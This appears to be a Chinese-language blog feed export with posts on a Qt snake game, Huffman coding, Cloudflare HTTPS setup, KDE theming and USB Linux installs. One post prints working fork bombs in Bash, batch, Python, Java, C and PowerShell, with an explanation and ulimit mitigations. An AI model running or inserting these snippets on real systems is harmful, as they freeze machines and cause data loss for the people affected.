class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">setY</span>(y+=<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> Left:<br>        linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">setX</span>(x-=<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> Right:<br>        linkedlist-&gt;<span class="hljs-built_in">first</span>()-&gt;pos.<span class="hljs-built_in">setX</span>(x+=<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">///</span><br><span class="hljs-comment">/// \brief Widget::checkFoodPosisEqualHeadPos</span><br><span class="hljs-comment">/// \param head</span><br><span class="hljs-comment">/// \param foodPos</span><br><span class="hljs-comment">/// 检测食物出现坐标是否在蛇身上</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Widget::checkFoodPosisEqualHeadPos</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(linkedlist-&gt;<span class="hljs-built_in">first</span>())&#123;<br>        Linkedlist::SnakeNode *p0=linkedlist-&gt;<span class="hljs-built_in">first</span>();<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">if</span>(p0-&gt;pos==m_foodPos)&#123;<br>                <span class="hljs-built_in">qDebug</span>()&lt;&lt;<span class="hljs-string">&quot;检测到食物处于蛇身上...&quot;</span>;<br>                <span class="hljs-built_in">resetFoodPos</span>();<br>            &#125;<br>            p0=p0-&gt;next;<br>        &#125; <span class="hljs-keyword">while</span> (p0);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>测试<br />
<img src="/uploads/images/snake/snake2.gif" alt="img" /></p>
<p>Bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Fork bomb命令</title>
    <url>/fork-bomb-commands/</url>
    <content><![CDATA[<p><strong>Fork bomb</strong> 是一种拒绝服务攻击，无限 <strong>fork</strong> 子进程以耗尽可用系统资源(CPU占用率高达100%)，由于资源匮乏而导致系统速度放慢或崩溃。</p>
<span id="more"></span>
<h3 id="linux-bash"><a class="markdownIt-Anchor" href="#linux-bash"></a> Linux Bash</h3>
<p>一个最简单的例子 (请在虚拟机上执行！)</p>
<figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span><span class="hljs-symbol">:</span>()&#123; <span class="hljs-symbol">:|</span><span class="hljs-symbol">:&amp;</span> &#125;;<span class="hljs-symbol">:</span><br></code></pre></div></td></tr></table></figure>
<ul>
<li>😦) 定义一个名为 <strong>:</strong> 的函数</li>
<li>{ … } 函数体</li>
<li>😐: 递归调用该命令</li>
<li>&amp; 后台运行，前台运行直接为 <strong>;</strong></li>
<li>; 分割符</li>
<li>: 执行名为 <strong>:</strong> 的函数</li>
</ul>
<p>执行该命令会创建一个子进程，然后在无限循环中重复自己，不断产生进程，结果是一个无法响应的系统(死机)。</p>
<h3 id="windows-batch"><a class="markdownIt-Anchor" href="#windows-batch"></a> Windows Batch</h3>
<p>Windows 批处理同样也可以发生fork bomb。新建一个.bat批处理文件，并添加一下简短的内容</p>
<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash">0 | %0</span><br></code></pre></div></td></tr></table></figure>
<h3 id="python"><a class="markdownIt-Anchor" href="#python"></a> Python</h3>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>	os.fork()<br></code></pre></div></td></tr></table></figure>
<h3 id="java"><a class="markdownIt-Anchor" href="#java"></a> Java</h3>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ForkBomb</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-keyword">true</span>)<br>    &#123;<br>      Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;javaw&quot;</span>, <span class="hljs-string">&quot;-cp&quot;</span>, System.getProperty(<span class="hljs-string">&quot;java.class.path&quot;</span>), <span class="hljs-string">&quot;ForkBomb&quot;</span>&#125;);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="c"><a class="markdownIt-Anchor" href="#c"></a> C</h3>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>) &#123;<br>      fork();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<h3 id="powershell"><a class="markdownIt-Anchor" href="#powershell"></a> PowerShell</h3>
<figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell"><span class="hljs-keyword">while</span>(<span class="hljs-variable">$true</span>) &#123; <br>    <span class="hljs-built_in">Start-Process</span> powershell.exe <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;-NoExit&quot;</span>, <span class="hljs-string">&quot;Get-ChildItem -Recurse C:&quot;</span>;<br>    <span class="hljs-built_in">Invoke-Expression</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;while($true) &#123;Start-Process powershell.exe -ArgumentList &quot;-NoExit&quot;, &quot;Get-ChildItem -Recurse C:&quot;&#125;&#x27;</span>;&#125;<br><br></code></pre></div></td></tr></table></figure>
<h3 id="避免"><a class="markdownIt-Anchor" href="#避免"></a> 避免</h3>
<p>在Linux下，可以通过 <strong>ulimit</strong> 设置的最大进程数(max user processes)</p>
<figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">$ ulimit -<span class="hljs-selector-tag">a</span><br>core file size          (blocks, -c) 0<br>data seg size           (kbytes, -d) unlimited<br>scheduling priority             (-e) 0<br>file size               (blocks, -f) unlimited<br>pending signals                 (-i) 30195<br>max locked memory       (kbytes, -l) 16384<br>max memory size         (kbytes, -m) unlimited<br>open files                      (-n) 1024<br>pipe size            (<span class="hljs-number">512</span> bytes, -p) 8<br>POSIX message queues     (bytes, -q) 819200<br>real-<span class="hljs-selector-tag">time</span> priority              (-r) 0<br>stack size              (kbytes, -s) 8192<br>cpu <span class="hljs-selector-tag">time</span>               (seconds, -t) unlimited<br>max user processes              (-u) 30195<br>virtual memory          (kbytes, -v) unlimited<br>file locks                      (-x) unlimited<br><br></code></pre></div></td></tr></table></figure>
<p>但是这只能在当前终端生效。因此，还可以修改 <strong>/etc/security/limits.conf</strong> 配置文件</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml">#<span class="hljs-tag">&lt;<span class="hljs-name">domain</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">type</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><br>*               soft    nproc            4096<br></code></pre></div></td></tr></table></figure>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>参考资料</p>
<ul>
<li><a href="https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html">https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html</a></li>
<li><a href="https://en.wikipedia.org/wiki/Fork_bomb">https://en.wikipedia.org/wiki/Fork_bomb</a></li>
</ul>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云+Github Page支持HTTPS</title>
    <url>/github-page-https/</url>
    <content><![CDATA[<p>正常来讲在阿里云注册了一个域名，默认时支持HTTP，要想让自己的域名在<code>Github Page</code>支持HTTPS，那么可以用 <code>Cloudflare</code></p>
<span id="more"></span>
<h3 id="cloudflare"><a class="markdownIt-Anchor" href="#cloudflare"></a> Cloudflare</h3>
<blockquote>
<p>Cloudflare是一家美国的跨国科技企业，总部位于旧金山，在英国伦敦亦设有办事处。Cloudflare以向客户提供网站安全管理、性能优化及相关的技术支持为主要业务。通过基于反向代理的内容传递网络(ContentDeliveryNetwork,CDN)及分布式域名解析服务(DistributedDomainNameServer)，Cloudflare可以帮助受保护站点抵御包括拒绝服务攻击(DenialofService)在内的大多数网络攻击，确保该网站长期在线，同时提升网站的性能、访问速度以改善访客体验</p>
</blockquote>
<h4 id="cloudflare配置"><a class="markdownIt-Anchor" href="#cloudflare配置"></a> Cloudflare配置</h4>
<p>首先需要登录 <a href="https://www.cloudflare.com/">官网</a> 注册一个账号，新注册账户登录后弹出对话框要求添加一个站点。可以是从阿里云注册的域名。<br />
<img src="/uploads/images/hexo/file_001.png" alt="img" /></p>
<p>这里添加一条DNS记录。我在阿里云域名解析中添加了CNAME记录，指向github服务器，所以这里我也直接添加一条CNAME DNS记录。</p>
<blockquote>
<p>在“DNS记录”下朝上，从下拉列表中选择 <strong>CNAME</strong>。<br />
<strong>Name</strong> 输入 <strong>@</strong><br />
<strong>Domain name</strong> 输入 <strong>域名</strong>，如 <a href="http://josexy.github.io">josexy.github.io</a><br />
将其保留为 自动TTL(<strong>Automatic TTL</strong>)。<br />
点击<strong>橙色云</strong>将其变成<strong>灰色</strong>。<br />
点击“添加记录”(<strong>Add Record</strong>)。</p>
</blockquote>
<p>之后我们还需要修改原域名的DNS服务器为Cloudflare提供的DNS服务器。要根据自己的来设置。<br />
<img src="/uploads/images/hexo/file_003.png" alt="img" /></p>
<p>修改Cloudflare提供的DNS服务器之后，可以看到变成了这样子。<br />
<img src="/uploads/images/hexo/file_004.png" alt="img" /></p>
<p>最后看到这个表示一切正常<br />
<img src="/uploads/images/hexo/file_009.png" alt="img" /></p>
<h4 id="ssl"><a class="markdownIt-Anchor" href="#ssl"></a> SSL</h4>
<p>选择 <code>Crypto</code> ，修改 <strong>SSL</strong> 为 <strong>Flexible</strong>(这里我建议选择 <strong>Full/Full(strict)</strong>，也是为了避免 <strong>ERR_TOO_MANY_REDIRECTS</strong> )，表示支持HTTPS<br />
<img src="/uploads/images/hexo/file_005.png" alt="img" /></p>
<h4 id="重定向"><a class="markdownIt-Anchor" href="#重定向"></a> 重定向</h4>
<p>选择 <code>Page Rules</code> ,添加规则，跳转到HTTPS。比如访问有人访问 <code>http://josephxy.com</code> ，那么我们就需要强制跳转（重定向）到 <code>https://josephxy.com</code>。</p>
<p>这里添加了两条规则<br />
<img src="/uploads/images/hexo/file_006.png" alt="img" /></p>
<p><img src="/uploads/images/hexo/file_007.png" alt="img" /></p>
<p><img src="/uploads/images/hexo/file_008.png" alt="img" /></p>
<p>最后我们可以看到小绿锁，表示支持HTTPS 😃<br />
<img src="/uploads/images/hexo/file_010.png" alt="img" /></p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<blockquote>
<p>参考文章：</p>
<ol>
<li><a href="https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/">https://blog.cloudflare.com/secure-and-fast-github-pages-with-cloudflare/</a></li>
<li><a href="https://docs.clickfunnels.com/custom-domains/dns-hosts/how-to-add-your-cname-record-to-cloudflare">https://docs.clickfunnels.com/custom-domains/dns-hosts/how-to-add-your-cname-record-to-cloudflare</a></li>
</ol>
</blockquote>
<p><strong><font color=red>注意： 可以在GitHub Pages [Setting] 中 Enforce HTTPS</font></strong></p>
]]></content>
      <categories>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Github</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>哈夫曼编码实现解压缩文本文件</title>
    <url>/huffman-encode-decode/</url>
    <content><![CDATA[<p>之前已经简单地介绍了LZW 编码实现的原理，它由一个初始字典在编码/解码的过程中不断的扩增字典内容，从而在下一次编码/解码遇到重复的文本串时从字典中找出之前的代码并写入文本文件，这样就避免了重复的文本而达到文本文件空间缩小的目的。本文主要从<s>简单介绍</s>哈夫曼树过渡到编码解码内容。</p>
<span id="more"></span>
<h3 id="哈夫曼树"><a class="markdownIt-Anchor" href="#哈夫曼树"></a> 哈夫曼树</h3>
<p>哈夫曼树也可以称作霍夫曼树（Huffman Tree），实际上它是一颗最优二叉树。它的最优主要体现在它的<code>加权路径长度WPL(weighted path length)</code> 最小！为什么最小，下文有解释…<br />
注意，节点的<code>加权路径长度</code>是指从根节点到该节点之间的路径长度与该节点权值的乘积。而WPL指的是所有<code>叶子节点</code>的加权路径长度<code>总和</code>。</p>
<p>哈夫曼树详细信息可以参考这位大佬的文章 <a href="https://blog.csdn.net/google19890102/article/details/54848262">数据结构和算法——Huffman树和Huffman编码</a> 。毕竟本文主要是介绍哈夫曼的编码解码过程，而且理解哈夫曼树也花不了多长时间…</p>
<h3 id="编码"><a class="markdownIt-Anchor" href="#编码"></a> 编码</h3>
<p>哈夫曼编码与LZW编码均为无损数据压缩算法的实现，哈夫曼编码最明显的一个特点是无需存储8位的字符，只需要存储01比特流即可，它是用较少的比特来表示出现频率高的字符，用较多的比特表示出现频率低的字符，即<code>可变长编码</code>（从哈夫曼树的角度理解就是字符出现频率/权值高的位于树的顶层，反之位于树的底层）。这样的话能够比较容易节省空间（毕竟写入以位为单位的数据总比写入以字节为单位的要节省空间）。</p>
<p>无论是编码还是解码，都需要构造<code>哈夫曼树</code>，并且得到一个<code>哈夫曼编码表</code>，之后我们就是利用这个表将ASCII文件中出现的字符所对应的二进制bit流写入到压缩文件中。</p>
<p>假设压缩文件为ASCII文件，那么在构造哈夫曼树之前还需要统计ASCII文件中每个ASCII字符出现的<code>频率</code>，也就是哈夫曼树每个节点的权值。统计方法很简单，直接扫描一遍文件即可。</p>
<p>那么如何构造哈夫曼树呢？从<code>字符出现频率/权值高的位于树的顶层，反之位于树的底层</code>可知，我们需要利用之前已经统计好的<code>字符频率表F(c)</code>来构造哈夫曼树，常见的方法是通过<code>优先级队列</code>来完成构造，除此之外还可以通过排序的方法完成。总之，构造的贪婪准则是每次选取两个出现频率最小(a,b)的节点作为子节点，其父节点表示子节点出现的总频率(a+b)，直到剩余根节点为止，这里的<code>节点</code>指的是F©中每个出现频率大于0的字符。宏观上来看，构造哈夫曼树是自底向上进行的。</p>
<p>举个例子，假设有一段文本<code>S=hhelloooo</code>，首先统计每个字符出现频率：</p>
<table>
<thead>
<tr>
<th>character</th>
<th>h</th>
<th>e</th>
<th>l</th>
<th>o</th>
</tr>
</thead>
<tbody>
<tr>
<td>frequency</td>
<td>2</td>
<td>1</td>
<td>2</td>
<td>4</td>
</tr>
</tbody>
</table>
<p>接着利用这个表构造哈夫曼树如下图所示<br />
<img src="/uploads/images/data_structure/huffman_cpp/1.PNG" alt="image" /></p>
<p>假设将父节点与左节点相连接分支标记为0、右节点的标记为1（也可以这样理解：0表示向左子树移动一步、1表示向右子树移动一步）<br />
<img src="/uploads/images/data_structure/huffman_cpp/2.PNG" alt="image" /></p>
<p>那么字符h在哈夫曼树中表示二进制串为 10，同样e、l、o对应的二进制串分别为110、111、0。<br />
于是进一步得到了一个完整的表格，从这个表格可以得到的信息有：</p>
<ul>
<li>字符到二进制代码的映射表</li>
<li>字符的频率表</li>
</ul>
<table>
<thead>
<tr>
<th>character</th>
<th>h</th>
<th>e</th>
<th>l</th>
<th>o</th>
</tr>
</thead>
<tbody>
<tr>
<td>frequency</td>
<td>2</td>
<td>1</td>
<td>2</td>
<td>4</td>
</tr>
<tr>
<td>bit stream</td>
<td>10</td>
<td>110</td>
<td>111</td>
<td>0</td>
</tr>
</tbody>
</table>
<p>将字符串 hhelloooo 每个出现的字符用二进制表示就是： 10.10.110.111.111.0.0.0.0。</p>
<p>注意，我们还发现字符h、e、l、o始终位于<code>叶子节点</code>，这样有什么意义吗？回答这个问题之前先引入一个概念：<code>变长前缀码</code>，大意是：<strong>没有一个代码是另一个代码的前缀</strong> 。 这句话我是摘自《数据结构算法与应用》，而《算法》第四版中是这样描述的：<strong>如果所有字符编码都不会成为其他字符编码的前缀，那么就不需要分隔符了</strong> 。其实这很容易理解，如果存在一个二进制代码是另外某一个二进制代码的前缀，那么在解码的过程中就会无法判断出该二进制代码属于哪个原始字符。因此，要避免这种情况，最好的办法就是将字符节点置于<code>叶子节点</code>，这样在解码的过程中自顶向下的寻找原始字符就可以完成了。</p>
<p>现在再来讨论另一个问题，毕竟哈夫曼编码是解压缩算法嘛，那么其压缩效率如何呢？</p>
<p>比如上面的字符串hhelloooo，由于每个ASCII码占一个字节，总共9bytes=72bits，编码后的二进制串 10101101,11111000,0 总共<strong>17bits</strong>，故压缩率大约是 23.6%，还行。<br />
再来看一个全是字母a且长度为约62k字节的字符串，压缩后的文件大小仅为5字节！现在仅仅改变一个字母a为b，原文件大小不变，此时压缩后的文件大小约为7.7K字节！</p>
<p>咳咳，现在回答之前的那个问题：为什么<code>加权路径长度WPL</code>是最小的。我们不妨来算一下现在这颗哈夫曼树的WPL是多少呢，<br />
其WPL为：1x4+2x2+3x1+3x2=4+4+3+6=<strong>17</strong>。这与压缩后的文件大小相等，这也说明了WPL越小，压缩文件体积越小，但也不可能为0。<br />
这时候得到一个结论：对于任意变长前缀码，编码后的二进制bit流的长度等于相应的哈夫曼树的WPL。</p>
<p>注意：在某些情况下压缩率甚至会超过100%！</p>
<p>可见哈夫曼编码对于文件压缩也是有要求的。</p>
<blockquote>
<p>1.必须<code>尽量</code>利用被压缩的数据流中的<code>已知</code>结构；<br />
2.小规模的字母表；<br />
3.较长的连续相同的位或字符；<br />
4.频繁使用的字符；<br />
5.较长的连续重复的位或字符。</p>
</blockquote>
<p>那么问题来了，既然能够压缩文件，那么也得必须完全成功解压文件才行啊，不然文件是真的损坏了哭都来不及:)。<s>总所周知</s>LZW 编码在实现编码的整个过程中没有将整个字典写入压缩文件，甚至在解码时也是没有一个完整的字典，这是LZW的独特之处。而哈夫曼编码则不同，它是需要写入相关信息的！这样在解码时才能够重构哈夫曼树。这个相关信息可以是字符到二进制代码的映射表bitstream©或者每个字符的频率表f©。不过《算法》第四版里面并没有用的以上两种方法，而是写入一个哈夫曼树结构（将哈夫曼树编码为bit流），这样做的直接目的是防止不必要的空间浪费。<br />
至于怎么编码，其实就是通过一次前序遍历将<code>内部节点</code>和<code>叶子节点</code>的开关bit写入压缩文件中。比如下面这张图<br />
<img src="/uploads/images/data_structure/huffman_cpp/3.PNG" alt="image" /></p>
<p>在一次前序遍历过程中，如果遇到内部节点就写入0bit，如果是叶子节点除了写入1bit外还需要将字符的ASCII码（8bits）也写入文件，最后再写入变长前缀码。这样做的理由方便解码时重构哈夫曼树。<br />
总之需要写入文件的内容有：编码哈夫曼树的bits流+<strong>字符个数(32bits)</strong>+对应字符的二进制代码（或者称为变长前缀码）。上面的图没有标字符个数的二进制（毕竟这个例子才只有9个字符，不可能画那么多0吧）。</p>
<p>当然了，不是每次都恰好将每8bits一个字节写入文件，可能最后就会多出N位<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>≤</mo><mi>N</mi><mo>≤</mo><mn>7</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">( 1 \le N \le 7)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8193em;vertical-align:-0.13597em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≤</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">7</span><span class="mclose">)</span></span></span></span>。要知道目前标准C++只能操作字节流，还不能操作位流（Java有BinaryStdIn/Out）。解决方法很简单粗暴，不足8位的就在后面补0。</p>
<p>现在小结一下，要实现哈夫曼压缩算法，需要以下几个步骤：</p>
<ul>
<li>从文件输入流统计在ASCII码范围内字符出现频率；</li>
<li>利用频率表构造哈夫曼树；</li>
<li>利用哈夫曼树构造哈夫曼编码表（如a:10010）；</li>
<li>写入哈夫曼树/bitstream©/f©；</li>
<li>写入字符个数，毕竟解码可不知道有多少个字符；</li>
<li>从哈夫曼编码表写入所有字符对应的二进制编码；</li>
<li>压缩结束。</li>
</ul>
<h3 id="解码"><a class="markdownIt-Anchor" href="#解码"></a> 解码</h3>
<p>解码就是编码的逆操作，不过一些细节还是需要注意的。<br />
还是以上面那个例子来说吧(⊙﹏⊙)<br />
01(01101111)01(01101000)01(01100101)1(01101100)+10101101111110000</p>
<p>解码的第一步肯定是读取前面那一坨已经将哈夫曼树编码成bit流的二进制串，关键是读取了该怎么构造出哈夫曼树。记得之前编码时我们是走一次前序遍历才将哈夫曼树编码成bit流，那么解码又有何不可呢？如果读取的一个bit是1，这说明该处是叶子节点(new)，那么接着再读取1byte就能够得到一个ASCII码，然后结束；如果读取到0bit，说明是这是一个内部节点(new)，将该内部节点作为父节点后那么继续递归，直到遍历完所有叶子节点。</p>
<p>至此，我们已经通过bit流构造出了哈夫曼树，接着再读取32bits或者64bits，总之是一个记录着字符个数的整数。</p>
<p>最后一步就是解析变长前缀码 10.10.110.111.111.0.0.0.0 。观察这一串二进制文本，它被分割的份数也就是他对应的字符总数，这也是为什么需要写入字符个数的原因，此时我们并不知道压缩文件总共有多少bits，但是我们知道它有N个字符，那么就可以通过哈夫曼树反解出所有的原始字符并写入解压文件。当然了，如果已经知道压缩文件有多少个bits，那么就没必要这个N了，直接的方法就是一位一位的读取并根据哈夫曼树解析出原始字符，不过就是另外一种方法，这里就不讨论了。</p>
<p>小结一下，解码过程可以分为以下几个步骤：</p>
<ul>
<li>读取压缩文件bit流重构哈夫曼树；</li>
<li>读取字符个数N；</li>
<li>根据哈夫曼树、N解析出原始字符，方法是自顶向下轮循解析；</li>
<li>解压结束。</li>
</ul>
<h3 id="解析位流"><a class="markdownIt-Anchor" href="#解析位流"></a> 解析位流</h3>
<p>代码参考了《算法》第四版的，不过书上是Java版本的，而且最dan teng的就是解析位流，无论是C的fread、fwrite、还是C++的basic_ifstream<bool>、basic_ofstream<bool>，都至少一个字节，根本不能直接操作位流，而Java的BinaryStdIn/Out可以操作位流。无奈之下，只能自己写一个简单地可以控制位流的类，原理也很简单，就是一些&amp;|&lt;&lt;&gt;&gt;…（后来发现网上已经有大佬完成了…）然后再改写Java版本的哈夫曼编码实现，<br />
本来想着能简就简的…<br />
想着能简就简的…<br />
能简就简的…<br />
简简的…<br />
简的…<br />
简.<br />
.</p>
<p>代码就不放了…<br />
码不放了…<br />
码了…<br />
了…<br />
…<br />
.</p>
<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
<p>《算法》第四版<br />
《数据结构算法与应用》<br />
<a href="https://en.wikipedia.org/wiki/Huffman_coding">Huffman coding</a><br />
<a href="https://www.cnblogs.com/skywang12345/p/3706370.html">哈夫曼树</a></p>
]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>DataStructures</tag>
        <tag>C</tag>
        <tag>Huffman</tag>
      </tags>
  </entry>
  <entry>
    <title>KDE Panel透明</title>
    <url>/kde-panel-transparency/</url>
    <content><![CDATA[<p>KDE的面板默认是不透明的，可以通过其他的主题达到半透明效果，然而这样还是不美观，因此…</p>
<span id="more"></span>
<p>本文主要参考了Manjaro论坛 <a href="https://forum.manjaro.org/t/where-can-the-transparency-of-the-kde-panel-be-set/50219">Where can the transparency of the KDE Panel be set?</a></p>
<p>未修改，真…丑…<br />
<img src="/uploads/images/kde_panel/1.png" alt="" /></p>
<p>KDE Plasma主题一般位于 <code>/usr/share/plasma/desktoptheme</code> 和 <code>$HOME/.local/share/plasma/desktoptheme</code>。</p>
<p>假如我的主题是<code>McMojave</code>，那么我通过 <code>inkscape</code> 修改svg矢量图形文件 <code>$HOME/.local/share/plasma/desktoptheme/McMojave/widgets/panel-background.svgz</code> 就可以达到全透明效果。</p>
<p>原图<br />
<img src="/uploads/images/kde_panel/2.png" alt="" /><br />
修改(删除)之后<br />
<img src="/uploads/images/kde_panel/3.png" alt="" /><br />
或者<br />
<img src="/uploads/images/kde_panel/4.png" alt="" /><br />
后者会删除面板边框阴影部分。</p>
<p>效果<br />
<img src="/uploads/images/kde_panel/5.png" alt="" /><br />
<img src="/uploads/images/kde_panel/6.png" alt="" /><br />
来一张桌面图 ლ(╹◡╹ლ)<br />
<img src="/uploads/images/kde_panel/7.png" alt="" /></p>
<p>Bye~</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Manjaro</tag>
        <tag>KDE</tag>
      </tags>
  </entry>
  <entry>
    <title>安装Linux系统到U盘</title>
    <url>/installed-system-to-usb/</url>
    <content><![CDATA[<p>有时我们想让一个系统随时随地切换到另一台机器上，实现便携式系统。即通过一个U盘启动切换要启动的系统。本文以一个Linux系统安装到U盘为例简单介绍。</p>
<span id="more"></span>
<h3 id="准备条件"><a class="markdownIt-Anchor" href="#准备条件"></a> 准备条件</h3>
<blockquote>
<p>Linux ISO镜像文件： <a href="https://www.kali.org/downloads/">Kali Linux Light 64 Bit (2018.2)</a> <strong>865M</strong><br />
VirtualBox虚拟机： <a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a><br />
U盘： Kingston Datatraveler USB(2.0) / <strong>SanDisk Ultra USB 3.0</strong> 推荐30GB以上</p>
<p>注意： 如果U盘是3.0的，VirtualBox需要额外安装拓展包。方法见下文</p>
</blockquote>
<p>注意： 如果U盘是3.0的，VirtualBox需要额外安装拓展包。方法见下文</p>
<h3 id="支持usb30"><a class="markdownIt-Anchor" href="#支持usb30"></a> 支持USB3.0</h3>
<p>默认virtual box只支持USB1.0/2.0，要想让他支持USB3.0，需要到 <a href="https://www.virtualbox.org/wiki/Downloads">官网</a> 下载拓展包（Extension Pack）<br />
<img src="/uploads/images/virtual_box/file_001.png" alt="img" /></p>
<p>注意，要下载对应VirtualBox版本的 <strong>Extension Pack</strong>，当前我使用的版本是5.2.8。另外我的U盘是USB2.0的</p>
<h3 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h3>
<p>在启动虚拟机前，需要插入U盘。<br />
用 <strong>lsblk</strong> 可看到该设备为sdb</p>
<blockquote>
<p>sdb 8:16 1 7.2G 0 disk<br />
└─sdb1 8:17 1 7.2G 0 part /media/root/3c6de664-902f-4f45-b588-f295e7c42666</p>
</blockquote>
<p>要让VirtualBox能够访问到USB设备，还需要执行以下命令</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">vboxmanage internalcommands createrawvmdk -filename usb.vmdk -rawdisk <span class="hljs-regexp">/dev/</span>sdb<br></code></pre></div></td></tr></table></figure>
